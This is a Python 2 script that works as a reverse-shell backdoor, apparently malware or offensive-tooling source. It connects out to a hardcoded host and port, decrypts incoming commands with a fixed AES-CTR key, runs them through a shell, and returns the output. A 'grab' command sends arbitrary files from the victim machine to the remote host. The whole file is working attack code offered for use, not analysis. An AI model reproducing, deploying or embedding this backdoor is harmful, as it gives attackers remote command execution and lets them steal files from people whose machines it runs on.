import socket
import subprocess
import os
from Crypto.Cipher import AES

counter = "X" * 16
key = "X" * 16

def encrypt(message):
    enc = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    return enc.encrypt(message)

def decrypt(message):
    enc = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    return enc.decrypt(message)

def transfer(s,path):
    
    if os.path.exists(str(path)):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE')
        f.close()

    else:
        s.send('File not found')


def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.233.128',8080))

    while True:
        command = decrypt(s.recv(1024))

        if 'terminate' in command:
            s.close()
            break

        if 'grab' in command:
            #The command to transfer a file will be grab*filepath e.g. grab*C:\Users\mike\Desktop\photo.jpg
            grab, path = command.split('*')

            try:
                transfer(s, path)
            except Exception, e:
                s.send(str(e))
                pass
            
            

        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            s.send(encrypt(CMD.stdout.read()))
            s.send(encrypt(CMD.stderr.read()))

def main():
    connect()

if __name__ == '__main__':
    main()
            
